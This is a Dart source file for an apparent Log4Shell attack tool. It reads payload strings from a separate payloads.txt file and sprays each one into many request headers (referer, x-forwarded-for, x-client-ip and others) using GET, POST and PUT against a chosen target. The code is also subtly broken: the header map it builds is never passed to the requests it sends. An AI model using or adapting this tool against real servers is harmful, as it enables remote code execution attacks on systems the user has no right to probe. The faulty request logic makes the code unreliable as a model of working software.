import 'dart:io' as io;
import 'package:http/http.dart';

//----------------------------------------------------------------------------->
/// A class that's probably not needed to contain all the stuff for this thing
/// to work.
class L4SSRequest {
  L4SSRequest(bool log, bool ver) {
    __log = log;
    __ver = ver;
  }

  bool __log = false;
  bool __ver = false;

  Future<bool> run({String target = ''}) async {
    var payloads = await getPayloadFile();

    // TODO: support more? figure out how to use the other methods in http.
    var availableMethods = [
      'GET',
      'POST',
      'PUT'
    ];

    // Loopity loop!
    for (String method in availableMethods) {
      if (__log && __ver) print('Method: $method');

      for (String payload in payloads) {
        if (__log && __ver) print('Payload: $payload');

        var headers = {
          'referer': payload,
          'x-http-host-override': payload,
          'true-client-ip': payload,
          'x-forwarded-port': payload,
          'x-client-ip': payload,
          'cf-connecting_ip': payload,
          'x-forwarded-host': payload,
          'contact': payload,
          'from': payload,
          'client-ip': payload,
          'x-forwarded-for': payload,
          'x-originating-ip': payload,
          'x-host': payload,
          'forwarded': payload,
          'accept': '*/*,',
          'x-real-ip': payload
        };

        // Pew pew!
        fireRequest(target, method, payload, headers);
      }
    }

    // I was going to do something with this but I forgot, so:
    // TODO: Remember what I was going to do with this, I'm sure it was super 
    // important!
    return false;
  }

  //--------------------------------------------------------------------------->
  /// Reads the payloads.txt file into a List<String>.
  Future<List<String>> getPayloadFile() async {
    var entries = new io.File('./payloads.txt');

    return entries.readAsLinesSync();
  }

  //--------------------------------------------------------------------------->
  /// String target = full url, including path, for your target.
  /// String method = Http method.
  /// String payload = Log4Shell payload string.
  /// Map<String, String> headers = Not sure... 
  void fireRequest(
      String target, String method, 
      String payload, Map<String, String> headers) async {
    int splitIndex = target.indexOf('/');

    String host = target.substring(0, splitIndex).trim();
    String path = target.substring(splitIndex + 1).trim();

    var uri = Uri.https(host, path);
    Response response;

    // There's probably a better way to do this.
    switch (method) {
      case 'GET':
        response = await get(uri);

        break;
      case 'POST':
        response = await post(uri);

        break;
      case 'PUT':
        response = await put(uri);

        break;
      default:
        response = await get(uri);

        break;
    }

    // Output!
    if (__log) print('${response.statusCode} ${target} ${method}');
  }
}